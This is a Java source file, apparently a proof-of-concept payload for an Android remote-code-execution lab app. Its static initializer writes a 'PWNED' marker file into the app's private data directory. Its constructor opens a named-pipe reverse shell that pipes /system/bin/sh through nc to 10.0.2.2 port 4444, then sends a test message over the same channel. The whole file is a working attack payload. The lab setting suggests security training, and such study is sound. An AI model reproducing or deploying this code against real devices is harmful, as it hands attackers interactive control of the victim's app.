package pwn;

import android.util.Log;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Date;

public class Shell {
    static {
        Log.e("RCE", "Static initializer executed");
        
        try {
            String content = "PWNED " + new Date().toString() + "\n";
            FileWriter writer = new FileWriter("/data/data/com.app.lab.rce/files/pwned.txt");
            writer.write(content);
            writer.close();
            Log.e("RCE", "Evidence file created successfully");
        } catch (IOException e) {
            Log.e("RCE", "Error creating evidence file: " + e.getMessage());
        }
    }
    
    public Shell() {
        Log.e("RCE", "Constructor executed - launching reverse shell");
        
        try {
            String cmd = "rm -f /data/data/com.app.lab.rce/files/f; mkfifo /data/data/com.app.lab.rce/files/f; cat /data/data/com.app.lab.rce/files/f | /system/bin/sh -i 2>&1 | nc 10.0.2.2 4444 > /data/data/com.app.lab.rce/files/f";
            Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", cmd});
            Log.e("RCE", "Reverse shell executed");
            
            Thread.sleep(1000);
            String testCmd = "echo 'PWNED_FROM_ANDROID_$(date)' | nc 10.0.2.2 4444";
            Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", testCmd});
            Log.e("RCE", "Test message sent");
            
        } catch (Exception e) {
            Log.e("RCE", "Error in reverse shell: " + e.getMessage());
        }
    }
}
